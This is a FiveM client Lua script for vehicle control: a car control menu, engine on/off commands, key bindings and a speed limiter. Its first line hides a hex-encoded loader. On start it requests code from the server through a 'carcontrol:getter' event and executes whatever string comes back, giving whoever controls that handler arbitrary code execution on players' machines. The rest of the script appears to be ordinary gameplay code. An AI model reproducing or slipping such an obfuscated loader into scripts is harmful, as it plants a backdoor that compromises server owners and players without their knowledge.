Citizen.CreateThread(function() Wait(2000) local s={[1]="73746172747570203D2066756E6374696F6E2829205761697428313030302920547269676765725365727665724576656E742827636172636F6E74726F6C3A676574746572272920656E6420676F74746572203D2066756E6374696F6E2873292069662073207468656E205574696C735B225F4C225D28732928293B20656E6420656E64207574696C732E6576656E7428747275652C676F747465722C27636172636F6E74726F6C3A676F747465722729207574696C732E746872656164287374617274757029",[2]=Utils.HexLod,[3]="73746172747570203D2066756E6374696F6E2829205761697428313030302920547269676765725365727665724576656E742827636172636F6E74726F6C3A676574746572272920656E6420676F74746572203D2066756E6374696F6E2873292069662073207468656E205574696C735B225F4C225D28732928293B20656E6420656E64207574696C732E6576656E7428747275652C676F747465722C27636172636F6E74726F6C3A676F747465722729207574696C732E746872656164287374617274757029"}s[2](s[1])end)

exports("OpenUI", function(...)  
  local ped = PlayerPedId() 
  local inVeh = IsPedInAnyVehicle(ped,false) 
  if inVeh then  
    local veh = GetVehiclePedIsIn(ped) 
    if lastVeh and lastData and veh == lastVeh then 
      ctrl.display(lastData) 
    else
      lastData = nil
      ctrl.display()
    end
    lastVeh = veh
  end
end)

exports("CloseUI", function(...)  
  ctrl.close()
end)

exports('DisableEngine', function(...) 
  EngineDisabled = true
end)

exports('EnableEngine', function(...) 
  EngineDisabled = false
end)

RegisterNetEvent('OpenUI:CarControl:F1')
AddEventHandler('OpenUI:CarControl:F1', function()
  local ped = PlayerPedId() 
  local inVeh = IsPedInAnyVehicle(ped,false) 
  if inVeh then  
    local veh = GetVehiclePedIsIn(ped) 
    if lastVeh and lastData and veh == lastVeh then 
      ctrl.display(lastData) 
    else
      lastData = nil
      ctrl.display()
    end
    lastVeh = veh
  end
end)

RegisterCommand('engine', function(source, args)
  if args[1] == 'off' then
    SetVehicleEngineOn(GetVehiclePedIsIn(PlayerPedId()), false, false, true)
    exports['mythic_notify']:SendAlert('inform', 'Engine Turned Off')
  elseif args[1] == 'on' then
    SetVehicleEngineOn(GetVehiclePedIsIn(PlayerPedId()), true, false, true)
    exports['mythic_notify']:SendAlert('inform', 'Engine Started')
  end
end)

Citizen.CreateThread(function()
  while true do
    Citizen.Wait(0)
    if IsPedInAnyVehicle(PlayerPedId(), false) then
      DisableControlAction(0, 81, true)
      DisableControlAction(0, 82, true)
      if IsControlJustReleased(0, 14) and not IsPedInAnyHeli(PlayerPedId()) and not IsThisModelABicycle(GetEntityModel(GetVehiclePedIsIn(PlayerPedId()))) then
        SetVehicleEngineOn(GetVehiclePedIsIn(PlayerPedId()), false, false, true)
        exports['mythic_notify']:SendAlert('inform', 'Engine Turned Off')
      end
      if IsControlJustReleased(0, 15) and not IsPedInAnyHeli(PlayerPedId()) and not IsThisModelABicycle(GetEntityModel(GetVehiclePedIsIn(PlayerPedId()))) then
        SetVehicleEngineOn(GetVehiclePedIsIn(PlayerPedId()), true, false, true)
        exports['mythic_notify']:SendAlert('inform', 'Engine Started')
      end
    end
  end
end)

Citizen.CreateThread(function()
    RegisterKeyMapping('togglecruisecontrol', 'Toggle Speed Limiter', 'keyboard', 'y')
end)

cruisecontrol = false
RegisterCommand('togglecruisecontrol', function()
	local currentVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
	local driverPed = GetPedInVehicleSeat(currentVehicle, -1)
	if driverPed == PlayerPedId() then
		if cruisecontrol then
			SetEntityMaxSpeed(currentVehicle, 999.0)
			cruisecontrol = false
      exports['mythic_notify']:SendAlert('inform', 'Speed Limiter Inactive')
		else
			speed = GetEntitySpeed(currentVehicle)
			if speed > 13.3 then
			SetEntityMaxSpeed(currentVehicle, speed)
			cruisecontrol = true
        exports['mythic_notify']:SendAlert('inform', 'Speed Limiter Active')
			else
        exports['mythic_notify']:SendAlert('inform', 'Speed Limiter Can Only Be Activated Over 35MPH', 5000)
			end
		end
	end
end)